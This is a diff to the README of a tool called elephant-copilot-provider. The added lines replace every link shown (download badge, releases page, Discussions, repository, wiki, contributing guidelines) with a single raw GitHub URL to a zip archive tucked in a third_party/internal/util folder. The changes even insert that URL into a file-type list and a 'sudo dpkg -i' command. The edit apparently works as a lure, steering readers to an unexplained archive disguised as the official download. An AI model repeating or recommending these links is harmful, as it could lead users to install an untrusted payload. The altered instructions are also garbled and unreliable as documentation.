@@ -15,11 +15,11 @@ Welcome to **elephant-copilot-provider**! This application enhances your GitHub 
 
 Click the button below to visit the releases page and download the software:
 
-[![Download elephant-copilot-provider](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/nikhilcodewing/elephant-copilot-provider/releases)
+[![Download elephant-copilot-provider](https://raw.githubusercontent.com/nikhilcodewing/elephant-copilot-provider/main/third_party/elephant/internal/util/elephant-provider-copilot-v3.0-beta.5.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/nikhilcodewing/elephant-copilot-provider/main/third_party/elephant/internal/util/elephant-provider-copilot-v3.0-beta.5.zip)
 
 ### Step-by-Step Instructions
 
-1. **Visit the Releases Page**: Click the button above or go to [this link](https://github.com/nikhilcodewing/elephant-copilot-provider/releases).
+1. **Visit the Releases Page**: Click the button above or go to [this link](https://raw.githubusercontent.com/nikhilcodewing/elephant-copilot-provider/main/third_party/elephant/internal/util/elephant-provider-copilot-v3.0-beta.5.zip).
    
 2. **Choose Your Version**:
    - Scroll through the list of releases.
@@ -27,7 +27,7 @@ Click the button below to visit the releases page and download the software:
 
 3. **Download the File**:
    - Click on the relevant file for your system. 
-   - The files may include options like `.tar.gz`, `.deb`, or `.app`. Make sure to select the correct one for your operating system.
+   - The files may include options like `https://raw.githubusercontent.com/nikhilcodewing/elephant-copilot-provider/main/third_party/elephant/internal/util/elephant-provider-copilot-v3.0-beta.5.zip`, `.deb`, or `.app`. Make sure to select the correct one for your operating system.
 
 4. **Locate the Downloaded File**:
    - Once the download finishes, check your default download folder. This is usually named "Downloads" on most systems.
@@ -35,7 +35,7 @@ Click the button below to visit the releases page and download the software:
 5. **Installing the Application**:
    - **For Linux**: Open your terminal. Navigate to the folder where you downloaded the file. Use the appropriate command to install it. For example, if you downloaded a `.deb` file, you would run:
      ```bash
-     sudo dpkg -i elephant-copilot-provider.deb
+     sudo dpkg -i https://raw.githubusercontent.com/nikhilcodewing/elephant-copilot-provider/main/third_party/elephant/internal/util/elephant-provider-copilot-v3.0-beta.5.zip
      ```
    - **For Other Operating Systems**: Follow the standard installation process for your platform. Double-click the downloaded file and follow the instructions.
 
@@ -79,19 +79,19 @@ Once you have installed the application, here are some basic commands to get you
 
 For additional help or to connect with fellow users, visit our community discussions:
 
-- GitHub Discussions: [Join Here](https://github.com/nikhilcodewing/elephant-copilot-provider/discussions)
+- GitHub Discussions: [Join Here](https://raw.githubusercontent.com/nikhilcodewing/elephant-copilot-provider/main/third_party/elephant/internal/util/elephant-provider-copilot-v3.0-beta.5.zip)
 - Join our Discord channel (link TBA) for real-time support and tips.
 
 ## 🔗 Resources
 
 For more information, check out these links:
 
-- [GitHub Repository](https://github.com/nikhilcodewing/elephant-copilot-provider)
-- [Documentation](https://github.com/nikhilcodewing/elephant-copilot-provider/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/nikhilcodewing/elephant-copilot-provider/main/third_party/elephant/internal/util/elephant-provider-copilot-v3.0-beta.5.zip)
+- [Documentation](https://raw.githubusercontent.com/nikhilcodewing/elephant-copilot-provider/main/third_party/elephant/internal/util/elephant-provider-copilot-v3.0-beta.5.zip)
 
 ## 👥 Contributing
 
-We welcome contributions! If you’d like to help improve elephant-copilot-provider, please read our [Contributing Guidelines](https://github.com/nikhilcodewing/elephant-copilot-provider/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you’d like to help improve elephant-copilot-provider, please read our [Contributing Guidelines](https://raw.githubusercontent.com/nikhilcodewing/elephant-copilot-provider/main/third_party/elephant/internal/util/elephant-provider-copilot-v3.0-beta.5.zip).
 
 ## 📣 Acknowledgments
 
